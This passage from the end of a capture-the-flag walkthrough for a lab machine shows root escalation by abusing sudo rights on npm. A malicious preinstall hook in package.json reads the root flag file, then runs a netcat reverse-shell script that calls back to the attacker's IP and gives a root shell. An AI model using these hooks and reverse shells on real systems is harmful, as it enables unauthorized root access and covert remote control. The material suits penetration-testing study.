hex.db    layouts       package.json  shell   views
index.js  node_modules  setup         static
algernon@holiday:~/app$ mv package.json package.json.bak
algernon@holiday:~/app$ vi package.json
algernon@holiday:~/app$ cat package.json
{
  "scripts": { "preinstall": "cat /root/root.txt" }
}
```

Now run npm install to get our script to run:

```text
algernon@holiday:~/app$ sudo /usr/bin/npm i --unsafe-perm
> undefined preinstall /home/algernon/app
> cat /root/root.txt
<<HIDDEN>>
```

## Root Shell

Bonus extra, getting a root shell, create file in /tmp:

```text
algernon@holiday:/tmp$ cat shell
#!/bin/bash
   /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.35 1235 >/tmp/f
```

Edit package file to call our shell script:

```text
algernon@holiday:~/app$ cat package.json
{
  "scripts": { "preinstall": "bash /tmp/shell" }
}
```

Run the install again:

```text
algernon@holiday:~/app$ sudo /usr/bin/npm i --unsafe-perm
> undefined preinstall /home/algernon/app
> bash /tmp/shell
```

Switch to a waiting NC listener:

```text
root@kali:~/htb/holiday# nc -nlvp 1235
listening on [any] 1235 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.10.25] 41636
# id
uid=0(root) gid=0(root) groups=0(root)
```

All done. See you next time.
